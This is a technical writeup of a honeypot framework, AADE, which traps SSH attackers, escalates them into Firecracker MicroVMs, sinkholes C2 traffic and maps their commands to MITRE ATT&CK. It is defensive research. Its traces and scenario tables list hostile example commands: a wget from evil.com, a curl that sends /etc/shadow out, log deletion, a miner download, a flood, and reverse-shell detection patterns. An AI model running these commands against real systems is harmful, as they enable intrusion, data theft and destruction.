# AADE — Autonomous Adaptive Deception Environment
## Comprehensive Technical Writeup

---

## 1. What is AADE?

AADE (Autonomous Adaptive Deception Environment) is a next-generation honeypot framework designed to **eliminate fingerprinting** through a multi-layered approach combining LLM-powered human-behavior synthesis, reinforcement-learning-driven interaction scaling, and live MicroVM migration — all mapped in real-time to the MITRE ATT&CK framework.

At its core, AADE is a **fully autonomous adaptive deception platform** that traps and studies attackers without ever revealing it's a honeypot. Unlike traditional honeypots that experienced attackers can identify in seconds, AADE creates an environment that is virtually indistinguishable from a real compromised machine at every layer.

---

## 2. How AADE Works: The Core Architecture

### The Two-Tier Deception Model

AADE operates on a **dual-environment architecture** that adaptively transitions attackers based on their behavior:

```
Attacker
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│  TIER 1: Low-Interaction (Cowrie)                       │
│  - SSH honeypot on port 22                              │
│  - Captures initial reconnaissance                      │
│  - Emulates shell responses                             │
│  - Filters out automated bot traffic                    │
└─────────────────────────────────────────────────────────┘
    │
    │ suspicious command detected (risk score > threshold)
    ▼
┌─────────────────────────────────────────────────────────┐
│  ORCHESTRATOR (The Brain)                               │
│  - RL Agent evaluates risk score                        │
│  - Decides: STAY / ESCALATE / TERMINATE                 │
└─────────────────────────────────────────────────────────┘
    │
    │ ESCALATE action triggered
    ▼
┌─────────────────────────────────────────────────────────┐
│  TIER 2: High-Interaction (Firecracker MicroVM)         │
│  - Real Linux kernel                                    │
│  - Real shell with writeable filesystem                 │
│  - LLM-generated fake user artifacts                     │
│  - Invisible out-of-band observation via AF_VSOCK      │
└─────────────────────────────────────────────────────────┘
```

### Phase-by-Phase Operation

| Phase | Component | Action |
|-------|-----------|--------|
| **Phase 1 — Installation** | `master_install.sh` | Installs Firecracker, Cowrie, mitmproxy, Python dependencies |
| **Phase 2 — Gold Image** | `generate_noise.py` | Seeds MicroVM rootfs with LLM-generated fake user history, files, cron jobs |
| **Phase 3 — Cowrie Trap** | Cowrie SSH Honeypot | Attacker connects via SSH; initial commands logged |
| **Phase 4 — Honeywall** | `honeywall_setup.sh` | iptables rules prevent malware/attacks from escaping to host network |
| **Phase 5 — Live Migration** | Orchestrator + Firecracker | On high-risk signals, boots MicroVM from sealed gold image |
| **Phase 6 — Silent Observation** | VSOCK Listener + C2 Sinkhole | All I/O captured out-of-band; C2 beacons intercepted |
| **Phase 7 — Intelligence** | TTP Mapper + Dashboard | Real-time MITRE ATT&CK classification and visualization |

---

## 3. How AADE is Different from Other Honeypots

### Traditional Honeypots vs. AADE

| Aspect | Traditional Honeypots | AADE |
|--------|----------------------|------|
| **Fingerprinting Resistance** | Static filesystems with no real user history → fingerprinted immediately | LLM generates contextually coherent fake data (bash history, SSH keys, cron jobs) |
| **Kernel Layer** | Emulated or shared kernel → `uname`, `/proc`, timing attacks reveal virtualization | Real Linux kernel inside Firecracker MicroVM — kernel fingerprinting returns genuine values |
| **Network Layer** | Fake or no network responses → C2 beacons fail silently | C2 traffic sinkholed via mitmproxy; malware receives convincing `200 OK` responses |
| **Adaptation** | Static responses; once attacker detects fakery, intelligence stops | RL agent dynamically adjusts deception depth based on attacker aggression |
| **Observation Channel** | Network-based logging (visible to attacker via `netstat`, `tcpdump`) | AF_VSOCK kernel-internal channel — completely invisible to attacker |
| **Migration Capability** | None — stuck in low or high interaction mode | Live migration from low-interaction Cowrie to high-interaction MicroVM transparently |

### Key Innovations

#### 1. **Live MicroVM Migration**
When Cowrie detects a serious attacker (e.g., they run `wget`, `curl`, or attempt persistence), the orchestrator transparently migrates the session into a real Firecracker MicroVM. The attacker never notices — they believe they've simply gotten a shell on a real machine.

#### 2. **LLM-Powered Human Behavior Synthesis**
The `llm_synthesizer.py` populates the gold image with contextually coherent fake data — plausible `.bash_history` that tells a story (a developer setting up a web server, deploying Python apps, configuring nginx), SSH key names, cron jobs, home directory structure. This makes fingerprinting far harder because the environment looks "lived-in."

#### 3. **RL-Adaptive Engagement**
The `rl_orchestrator.py` uses Proximal Policy Optimization (PPO) to optimize the tradeoff: reveal more of the "system" to keep the attacker engaged longer vs. stay quiet to avoid detection. The reward signal is time-on-target and intelligence gathered.

#### 4. **Out-of-Band Observation via AF_VSOCK**
All MicroVM I/O is mirrored to the host via AF_VSOCK — a kernel-internal channel the attacker cannot see or interfere with. No SSH tunneling, no network traffic, no fingerprinting surface. From inside the VM, there's no socket in `netstat`, no traffic in `tcpdump`, no process visible.

#### 5. **C2 Sinkhole with Fake Responses**
The mitmproxy-based C2 sinkhole intercepts all outbound traffic from the MicroVM. If the attacker's malware beacons home, the sinkhole logs the C2 address, payload, and protocol while returning convincing fake `200 OK` responses to keep the malware alive and revealing more TTPs.

---

## 4. What Happens in the Backend When an Attack Occurs

### End-to-End Data Flow: A Single Command's Journey

Let's trace what happens when an attacker types: `wget http://evil.com/shell.sh`

#### Step 1: Initial Capture (Cowrie)
```
Attacker ──SSH──► [Cowrie on port 22]
                        │
                        ▼
            cowrie.json entry created:
            {
              "eventid": "cowrie.command.input",
              "input": "wget http://evil.com/shell.sh",
              "src_ip": "1.2.3.4",
              "timestamp": "2026-04-14T10:00:00.000Z"
            }
```

#### Step 2: Orchestrator Risk Assessment
```
orchestrator.py (tailer.follow reads cowrie.json)
    │
    ├──► cmd = "wget http://evil.com/shell.sh"
    ├──► ttps = map_command_to_ttpx(cmd) 
    │     └──► [{"id": "T1105", "name": "Ingress Tool Transfer"}]
    ├──► max_ttp_severity += 5 (now 15 - 3rd TTP hit)
    ├──► risk_score = (8 cmds × 2) + (15 severity) = 31
    └──► rl_agent.decide(8, 15, 120s, 31)
              └──► action = 1 (ESCALATE - T1105 is high signal)
                    └──► start_firecracker() → MicroVM boots
```

#### Step 3: Firecracker MicroVM Boot
```
start_firecracker():
    │
    ├──► Writes /tmp/vmconfig.json:
    │     {
    │       "vcpu_count": 2,
    │       "mem_size_mib": 512,
    │       "kernel_image_path": "~/aade/kernels/vmlinux.bin",
    │       "drive_id": "rootfs",
    │       "path_on_host": "~/aade/images/rootfs_gold.ext4",
    │       "is_read_only": false,  // Attacker CAN write files!
    │       "vsock": {"guest_cid": 4, "uds_path": "..."}
    │     }
    └──► subprocess.Popen(['firecracker', '--no-api', '--config-file', '/tmp/vmconfig.json'])
              └──► MicroVM boots in ~125ms
```

#### Step 4: In-MicroVM Execution & Observation
```
[Firecracker MicroVM]
    │
    ├──► Attacker types: wget http://evil.com/shell.sh
    ├──► Real HTTP request goes outbound
    ├──► iptables/honeywall intercepts → routes to mitmproxy:8080
    │
    ├──► [Inside VM: logger_agent.py runs via PROMPT_COMMAND hook]
    │     ├──► Captures: exit_code=0, cmd="wget...", user="root", cwd="/root"
    │     ├──► Builds event dict
    │     ├──► Opens AF_VSOCK to HOST_CID=2, port 5005
    │     └──► Sends JSON event silently (try/except: pass — never reveals errors)
    │
    └──► Request flows through honeywall to C2 sinkhole
```

#### Step 5: C2 Sinkhole Interception
```
c2_sinkhole.py (mitmproxy addon)
    │
    ├──► request(flow) hook fires
    ├──► Extracts: method=GET, url=http://evil.com/shell.sh, headers, body
    ├──► Logs to c2_traffic_2026-04-14.jsonl
    └──► Returns fake response:
          HTTP 200 OK
          {"status": "ok", "message": "beacon received"}
                └──► Attacker sees download progress, saves to /tmp/shell.sh
```

#### Step 6: VSOCK Intelligence Reception (Host Side)
```
vsock_listener.py (on host)
    │
    ├──► Receives event from AF_VSOCK port 5005
    ├──► Stamps timestamp
    ├──► Calls map_command_to_ttpx("wget http://evil.com/shell.sh")
    │     └──► [{"id": "T1105", "name": "Ingress Tool Transfer"}]
    ├──► T1105 NOT in LLM synthesis gate (only T1083, T1082 trigger synthesis)
    ├──► Appends to session_2026-04-14.jsonl:
    │     {
    │       "cmd": "wget http://evil.com/shell.sh",
    │       "user": "root", "cwd": "/root", "hostname": "prod-web-01",
    │       "mitre_tags": [{"id": "T1105", "name": "Ingress Tool Transfer"}],
    │       "timestamp": "2026-04-14T10:00:05.123Z"
    │     }
    └──► Prints: [INTEL] root@prod-web-01:/root$ wget http://evil.com/shell.sh
```

#### Step 7: Dashboard Visualization
```
dashboard.py (Flask, port 5000)
    │
    ├──► GET /api/stats polled by frontend every ~5s
    ├──► Reads session_2026-04-14.jsonl
    ├──► ttp_counts["T1105"] = {"name": "Ingress Tool Transfer", "count": 1}
    ├──► mode = "ADAPTIVE (High Interaction)" [event from non-Cowrie hostname]
    └──► Frontend renders:
          • ATT&CK heatmap: C&C column lights up (T1105)
          • Command feed: shows wget command with T1105 badge
          • Mode indicator: "ADAPTIVE"
          • Total latency: ~1-3 seconds from keystroke to dashboard
```

---

## 5. Deep Dive: Key Components

### 5.1 The Orchestrator (`orchestrator.py`)
The central command loop that ties together all subsystems:

| Method | Purpose |
|--------|---------|
| `__init__` | Loads RL agent, resets session state (cmd_count, risk_score, max_ttp_severity) |
| `calculate_risk()` | Formula: `min((cmd_count × 2) + (len(ttp_list) × 20), 100)` |
| `start_firecracker()` | Boots MicroVM with 2 vCPUs, 512MB RAM, writeable rootfs |
| `monitor_cowrie()` | Main event loop using `tailer.follow()` on cowrie.json |

### 5.2 The RL Agent (`rl_orchestrator.py`)
Uses Proximal Policy Optimization (PPO) to decide deception strategy:

| Action | Meaning |
|--------|---------|
| 0 | STAY — Continue observing in Cowrie (low-interaction) |
| 1 | ESCALATE — Boot MicroVM, switch to high-interaction |
| 2 | TERMINATE — Block the attacker |

**Reward Function:**
- ESCALATE → `+10` (intelligence gain)
- TERMINATE → `-5` (lost potential intel)
- STAY → `+1` (passive observation reward)
- Auto-terminate if `risk_score > 80` (critical risk)

### 5.3 TTP Mapper (`ttp_mapper.py`)
Regex-based classifier mapping commands to MITRE ATT&CK:

| Command Pattern | TTP ID | TTP Name | Category |
|-----------------|--------|----------|----------|
| `ls`, `dir` | T1083 | File and Directory Discovery | Discovery |
| `ps`, `top` | T1057 | Process Discovery | Discovery |
| `ip addr`, `ifconfig` | T1016 | System Network Configuration Discovery | Discovery |
| `whoami`, `id` | T1033 | System Owner/User Discovery | Discovery |
| `uname`, `cat /etc/os-release` | T1082 | System Information Discovery | Discovery |
| `cat /etc/passwd` | T1003 | OS Credential Dumping | Credential Access |
| `wget`, `curl`, `scp` | T1105 | Ingress Tool Transfer | C&C |
| `ssh`, `telnet` | T1021.004 | Remote Services: SSH | Lateral Movement |
| `crontab` | T1053.003 | Scheduled Task: Cron | Persistence |
| `useradd`, `adduser` | T1136.001 | Create Account: Local Account | Persistence |
| `chmod`, `chown` | T1222.002 | File/Dir Permissions Modification | Defense Evasion |
| `nc`, `netcat`, `nmap` | T1095 | Non-Application Layer Protocol | C&C |
| `/bin/bash -i` | T1059.004 | Unix Shell (Reverse Shell) | Execution |
| `python -c 'import socket'` | T1059.006 | Python Interpretation | Execution |
| `xmrig`, `miner` | T1496 | Resource Hijacking (Cryptojacking) | Impact |
| `rm -rf log`, `unset HISTFILE` | T1070 | Indicator Removal on Host | Defense Evasion |
| `iptables -F` | T1562.004 | Disable or Modify Firewalls | Defense Evasion |

### 5.4 LLM Synthesizer (`llm_synthesizer.py`)
Generates realistic terminal output for recon commands. Two backends:
- **OpenAI (GPT-4)** — Cloud-based, requires API key
- **Ollama (Llama3/Mistral)** — Local, default for Kali environments

**Synthesis Trigger:** Only activates for T1083 (File Discovery) and T1082 (System Info) — the recon commands where convincing fake responses matter most.

### 5.5 In-VM Logger Agent (`logger_agent.py`)
A 41-line spy script baked into the gold image:
- Runs via `.bashrc` `PROMPT_COMMAND` hook
- Captures every command with exit code, user, cwd, hostname
- Sends to host via AF_VSOCK (CID=2, port=5005)
- **Completely silent** — wrapped in `try/except: pass`

### 5.6 C2 Sinkhole (`c2_sinkhole.py`)
Mitmproxy addon that:
- Intercepts all outbound HTTP/HTTPS from MicroVM
- Logs full URL, headers, body to `c2_traffic_DATE.jsonl`
- Returns `200 OK {"status": "ok", "message": "beacon received"}`
- **Critical:** Fake responses keep malware alive and revealing TTPs

### 5.7 Honeywall (`honeywall_setup.sh`)
iptables-based network containment:
- Blocks outbound traffic from MicroVM to real internet IPs
- Allows traffic to mitmproxy port 8080 (C2 capture)
- Logs dropped packets for forensic analysis
- Rate-limits DDoS attempts to 1Kbps

---

## 6. Attack Scenario Coverage

AADE handles 20+ attack scenarios across 5 MITRE ATT&CK tiers:

### Phase A: Discovery & Staging (Bot-Heavy / Tier 1)
| ID | Scenario | Trigger |
|----|----------|---------|
| 01 | System Reconnaissance (`whoami; id; uname -a`) | Bot Environment (Cowrie) |
| 02 | Network Enumeration (`netstat -antp; route -n`) | Bot Environment (Cowrie) |
| 03 | Service & OS Fingerprinting (`cat /etc/os-release`) | Bot Environment (Cowrie) |
| 04 | Brute Force Attack (`hydra -l admin -P passlist.txt`) | Bot Environment (Cowrie) |
| 05 | Credential Preparation (`cat /etc/passwd`) | Bot Environment (Cowrie) |

### Phase B: Interactive Escalation (Human-Centric / Tier 2)
| ID | Scenario | Trigger |
|----|----------|---------|
| 06 | External Payloading (`wget http://.../malware.sh`) | Bot → Near threshold |
| 07 | SQL Injection Probing (`sqlmap --url=...`) | **Human Environment** (Firecracker) |
| 08 | Sudo Privilege Probe (`sudo -l`) | **Human Environment** (Firecracker) |
| 09 | Automated Persistence (`crontab -e`) | **Human Environment** (Firecracker) |
| 10 | Cross Site Scripting (`curl -d "name=<script>..."`) | **Human Environment** (Firecracker) |
| 11 | Anti-Forensics (`rm -rf /var/log/syslog`) | **Human Environment** (Firecracker) |
| 12 | Process Camouflage (`ps aux | grep -v "malware"`) | **Human Environment** (Firecracker) |
| 13 | Reverse Shell (`python3 -c 'import socket...'`) | **Human Environment** (Firecracker) |

### Phase C: Deep Deception & Impact (APT / Tier 3)
| ID | Scenario | Trigger |
|----|----------|---------|
| 14 | Credential Persistence (`ssh-keygen; cat id_rsa.pub`) | **Human Environment** (Firecracker) |
| 15 | Ransomware Deployment (`gpg --symmetric --cipher-algo AES256`) | **Human Environment** (Firecracker) |
| 16 | DDoS Flood Attack (`hping3 -S --flood`) | **Human Environment** (Firecracker) |
| 17 | Resource Mining (`curl -LO http://miner.pool/xmrig`) | **Human Environment** (Firecracker) |
| 18 | Kernel Escape Discovery (`sysctl -w kernel.panic=1`) | **Deep High-Interaction** |
| 19 | Covert Exfiltration (`curl --data-binary @/etc/shadow`) | **Deep High-Interaction** |
| 20 | MITM Intercept (`arpspoof -i eth0`) | **Deep High-Interaction** |

---

## 7. Why AADE's Design Choices Matter

### Why Firecracker instead of Docker or chroot?
Docker and chroots share the host kernel. A determined attacker can fingerprint this (same PID namespace leakage, recognizable `/proc` entries, timing differences). Firecracker provides a real separate kernel, making kernel fingerprinting attacks return genuinely different results.

### Why AF_VSOCK instead of network telemetry?
Any network-based telemetry channel is visible to the attacker (they can run `netstat`, `ss`, or `tcpdump`). AF_VSOCK is a kernel-internal channel — it is completely invisible to anything running inside the VM. There is no socket in `netstat`, no traffic in tcpdump, no process in `ps`.

### Why return `200 OK` from the C2 sinkhole?
Most C2 malware has dead-man-switch logic: if C2 is unreachable for N minutes, it deletes itself. Dropping connections tells the attacker the C2 is unreachable. By returning `200 OK` with a plausible JSON body, the malware continues running, continues executing commands, and continues revealing TTPs.

### Why JSONL instead of a database?
JSONL (newline-delimited JSON) is append-only, requires no server process, survives crashes without data loss, and can be read with standard Unix tools (`grep`, `jq`, `tail -f`). The dashboard reads it with simple Python file I/O. This keeps the system deployable on a minimal Kali install with zero additional infrastructure.

### Why is the rootfs writeable?
The Firecracker VM config sets `"is_read_only": False` — the attacker CAN write files. This is intentional: it makes the environment feel more real and reveals persistence TTPs (cron jobs, SSH keys, backdoor accounts) that would be impossible to observe in a read-only environment.

---

## 8. Summary: The AADE Advantage

**AADE is built on a simple truth: a honeypot that reveals itself is useless.**

Traditional honeypots fail because:
1. ❌ Static filesystems are obviously fake
2. ❌ Emulated kernels leak virtualization artifacts  
3. ❌ No network responses kill C2 beacons
4. ❌ Once fingerprinted, all intelligence stops

AADE solves all four:
1. ✅ LLM generates lived-in filesystems with believable history
2. ✅ Real Firecracker kernel passes all fingerprinting tests
3. ✅ C2 sinkhole captures beacons while keeping malware alive
4. ✅ RL agent dynamically adapts to maximize intelligence gathering

**The result:** Attackers believe they've compromised a real machine, while you watch every move in real-time, mapped to MITRE ATT&CK, with complete forensic capture of their TTPs.

---

*AADE — built to let attackers think they've won, while you watch every move.*
